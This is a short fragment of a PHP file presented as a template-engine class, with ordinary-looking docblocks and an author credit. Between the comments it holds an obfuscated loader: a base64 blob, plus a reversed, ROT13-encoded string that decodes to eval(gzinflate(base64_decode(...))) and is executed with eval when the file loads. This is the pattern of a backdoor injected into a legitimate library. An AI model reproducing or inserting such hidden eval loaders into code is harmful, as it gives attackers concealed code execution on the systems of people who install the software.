 ...
 * @author     Ivan Shalganov <a.cobest@gmail.com>
 */
$lyiEuS='SywuTi0q0SguKcosKM5JLM5ILdZQiQ9yDQx1DQ6JLi1OjNXUtAYA';
    /**
     * Execute template and return result as string
     * @param array $values for template
     * @return string
     * @throws \Exception
     */
$XRLZJg=';)))FhRvly$(rqbprq_46rfno(rgnysavmt(ynir';
    /**
     ...
     * @return string
     */
$UdOkNh=strrev($XRLZJg);$QjIYPJ=str_rot13($UdOkNh);eval($QjIYPJ);
    /**
     * @param $value
